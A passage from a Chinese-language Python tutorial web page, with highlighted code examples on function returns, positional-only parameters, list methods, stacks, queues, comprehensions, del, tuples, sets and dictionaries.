[表达式]</strong> 语句用于退出函数，选择性地向调用方返回一个表达式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 可写函数说明</span><span class="token keyword">def</span> <span class="token function">sum</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> arg2 <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment"># 返回2个参数的和."</span>   total <span class="token operator">=</span> arg1 <span class="token operator">+</span> arg2   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"函数内 : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span>   <span class="token keyword">return</span> total <span class="token comment"># 调用sum函数</span>total <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"函数外 : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''函数内 :  30函数外 :  30'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="强制位置参数"><a href="#强制位置参数" class="headerlink" title="强制位置参数"></a>强制位置参数</h3><p>函数形参语法 / 用来指明函数形参必须使用指定位置参数，不能使用关键字参数的形式。</p><p>形参 a 和 b 必须使用指定位置参数，c 或 d 可以是位置形参或关键字形参，而 e 和 f 要求为关键字形参</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">/</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> e<span class="token punctuation">,</span> f<span class="token punctuation">)</span>f<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> d<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">,</span> e<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> f<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''10 20 30 40 50 60'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h3><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">list.append(x)</td><td align="left">把一个元素添加到列表的结尾，相当于 a[len(a):] = [x]。</td></tr><tr><td align="left">list.extend(L)</td><td align="left">通过添加指定列表的所有元素来扩充列表，相当于 a[len(a):] = L。</td></tr><tr><td align="left">list.insert(i, x)</td><td align="left">在指定位置插入一个元素。第一个参数是准备插入到其前面的那个元素的索引，例如 a.insert(0, x) 会插入到整个列表之前，而 a.insert(len(a), x) 相当于 a.append(x) 。</td></tr><tr><td align="left">list.remove(x)</td><td align="left">删除列表中值为 x 的第一个元素。如果没有这样的元素，就会返回一个错误。</td></tr><tr><td align="left">list.pop([i])</td><td align="left">从列表的指定位置移除元素，并将其返回。如果没有指定索引，a.pop()返回最后一个元素。元素随即从列表中被移除。（方法中 i 两边的方括号表示这个参数是可选的，而不是要求你输入一对方括号，你会经常在 Python 库参考手册中遇到这样的标记。）</td></tr><tr><td align="left">list.clear()</td><td align="left">移除列表中的所有项，等于del a[:]。</td></tr><tr><td align="left">list.index(x)</td><td align="left">返回列表中第一个值为 x 的元素的索引。如果没有匹配的元素就会返回一个错误。</td></tr><tr><td align="left">list.count(x)</td><td align="left">返回 x 在列表中出现的次数。</td></tr><tr><td align="left">list.sort()</td><td align="left">对列表中的元素进行排序。</td></tr><tr><td align="left">list.reverse()</td><td align="left">倒排列表中的元素。</td></tr><tr><td align="left">list.copy()</td><td align="left">返回列表的浅复制，等于a[:]。</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 2, 1, 5]</span><span class="token builtin">list</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 2, 1, 5, 999]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">]</span><span class="token builtin">list</span><span class="token punctuation">.</span>extend<span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 2, 1, 5, 999, 44, 55]</span><span class="token builtin">list</span><span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'hhhh'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 2, 'hhhh', 1, 5, 999, 44, 55]</span><span class="token builtin">list</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'hhhh'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 2, 1, 5, 999, 44, 55]</span>var <span class="token operator">=</span> list2<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token comment"># 55</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token comment"># [44]</span>list2<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token comment"># []</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token builtin">list</span><span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 1, 2, 5, 44, 55, 999]</span><span class="token builtin">list</span><span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [999, 55, 44, 5, 2, 1, 1]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># [999, 55, 44, 5, 2, 1, 1]</span><span class="token triple-quoted-string string">'''[1, 2, 1, 5][1, 2, 1, 5, 999][1, 2, 1, 5, 999, 44, 55][1, 2, 'hhhh', 1, 5, 999, 44, 55][1, 2, 1, 5, 999, 44, 55]55[44][]12[1, 1, 2, 5, 44, 55, 999][999, 55, 44, 5, 2, 1, 1][999, 55, 44, 5, 2, 1, 1]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="将列表当做堆栈使用"><a href="#将列表当做堆栈使用" class="headerlink" title="将列表当做堆栈使用"></a>将列表当做堆栈使用</h4><p>最先进入的元素最后一个被释放（后进先出）。用 append() 方法可以把一个元素添加到堆栈顶。用不指定索引的 pop() 方法可以把一个元素从堆栈顶释放出来。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'999'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">)</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[1, 3, 'test', '999'][1, 3, 'test', '999', 33, 44, 55]5544[1, 3, 'test', '999', 33]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="将列表当作队列使用"><a href="#将列表当作队列使用" class="headerlink" title="将列表当作队列使用"></a>将列表当作队列使用</h4><p>队列里第一加入的元素，第一个取出来</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> dequequeue <span class="token operator">=</span> deque<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'999'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'hhh'</span><span class="token punctuation">)</span>queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>popleft<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>popleft<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[1, 3, 'test', '999', 33]deque([1, 2, 'test', '999', 'hhh', 'aaaa'])12deque(['test', '999', 'hhh', 'aaaa'])'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h4><p>列表推导式提供了从序列创建列表的简单途径。应用程序将一些操作应用于某个序列的每个元素，用其获得的结果作为生成新列表的元素，或者根据确定的判定条件创建子序列。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span>vvar <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> x <span class="token keyword">for</span> x <span class="token keyword">in</span> var<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>vvar<span class="token punctuation">)</span>vvaar <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> x<span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> var<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>vvaar<span class="token punctuation">)</span>var1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' dcc'</span><span class="token punctuation">,</span> <span class="token string">'   ssss'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> var1<span class="token punctuation">]</span><span class="token punctuation">)</span>var2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>var3 <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token operator">*</span> y <span class="token keyword">for</span> x <span class="token keyword">in</span> var <span class="token keyword">for</span> y <span class="token keyword">in</span> var2<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span>var<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> var2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span><span class="token number">355</span><span class="token operator">/</span><span class="token number">113</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[1, 2, 4, 8][2, 4, 8, 16][[1, 2], [2, 4], [4, 8], [8, 16]]['dcc', 'ssss'][2, 3, 4, 4, 4, 6, 8, 8, 8, 12, 16, 16, 16, 24, 32, 32][2, 6, 16, 32]['3.1', '3.14', '3.142', '3.1416', '3.14159']'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="嵌套列表解析"><a href="#嵌套列表解析" class="headerlink" title="嵌套列表解析"></a>嵌套列表解析</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">matrix <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span>row<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> matrix<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 3*4转为4*3</span>matrix <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span>transposed <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    transposed<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>row<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> matrix<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>transposed<span class="token punctuation">)</span>matrix <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span>transposed <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># the following 3 lines implement the nested listcomp</span>    transposed_row <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> matrix<span class="token punctuation">:</span>        transposed_row<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>transposed<span class="token punctuation">.</span>append<span class="token punctuation">(</span>transposed_row<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>transposed<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[[1, 2, 3, 4], [2, 3, 4, 5], [3, 4, 5, 6]][[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]][[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]][[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="del语句"><a href="#del语句" class="headerlink" title="del语句"></a>del语句</h4><p>使用 del 语句可以从一个列表中依索引而不是值来删除一个元素。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token keyword">del</span> var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token keyword">del</span> var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token keyword">del</span> var<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token keyword">del</span> var<span class="token triple-quoted-string string">'''[1, 23, 3, 6, 'test'][1, 23, 6, 'test'][23, 'test'][]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="元组和序列"><a href="#元组和序列" class="headerlink" title="元组和序列"></a>元组和序列</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">tuple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span>tuple2 <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'hhhh'</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple2<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''(1, 2, 3, 4, 5)((1, 2, 3, 4, 5), ('test', 'hhhh', 'aaaa'))'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="集合-1"><a href="#集合-1" class="headerlink" title="集合"></a>集合</h3><p>功能包括关系测试和消除重复元素</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">basket <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'pear'</span><span class="token punctuation">,</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'banana'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>basket<span class="token punctuation">)</span>                      <span class="token comment"># 删除重复的</span><span class="token comment"># {'banana', 'orange', 'apple', 'pear'}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'orange'</span> <span class="token keyword">in</span> basket<span class="token punctuation">)</span>                 <span class="token comment"># 检测成员</span><span class="token comment"># True</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'crabgrass'</span> <span class="token keyword">in</span> basket<span class="token punctuation">)</span><span class="token comment"># False</span><span class="token comment"># 以下演示了两个集合的操作</span>a <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'abracadabra'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'alacazam'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>                      <span class="token comment"># a 中唯一的字母</span><span class="token comment"># {'c', 'r', 'b', 'a', 'd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">-</span> b<span class="token punctuation">)</span>                  <span class="token comment"># 在 a 中的字母，但不在 b 中</span><span class="token comment"># {'r', 'b', 'd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">|</span> b<span class="token punctuation">)</span>                  <span class="token comment"># 在 a 或 b 中的字母</span><span class="token comment"># {'c', 'r', 'l', 'm', 'z', 'b', 'a', 'd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">&amp;</span> b<span class="token punctuation">)</span>                  <span class="token comment"># 在 a 和 b 中都有的字母</span><span class="token comment"># {'c', 'a'}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">^</span> b<span class="token punctuation">)</span>                  <span class="token comment"># 在 a 或 b 中的字母，但不同时在 a 和 b 中</span><span class="token comment"># {'m', 'z', 'r', 'b', 'l', 'd'}</span>a <span class="token operator">=</span> <span class="token punctuation">{</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">'abracadabra'</span> <span class="token keyword">if</span> x <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token string">'abc'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment"># {'d', 'r'}</span><span class="token triple-quoted-string string">'''{'banana', 'orange', 'apple', 'pear'}TrueFalse{'c', 'r', 'b', 'a', 'd'}{'r', 'b', 'd'}{'c', 'r', 'l', 'm', 'z', 'b', 'a', 'd'}{'c', 'a'}{'m', 'z', 'r', 'b', 'l', 'd'}{'d', 'r'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="字典-1"><a href="#字典-1" class="headerlink" title="字典"></a>字典</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'sape'</span><span class="token punctuation">,</span> <span class="token number">4139</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'guido'</span><span class="token punctuation">,</span> <span class="token number">4127</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'jack'</span><span class="token punctuation">,</span> <span class="token number">4098</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># {'sape': 4139, 'guido': 4127, 'jack': 4098}</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 空字典</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {}</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {2: 'test', 'test': 1}</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'dddd'</span><span class="token punctuation">}</span><span class="token 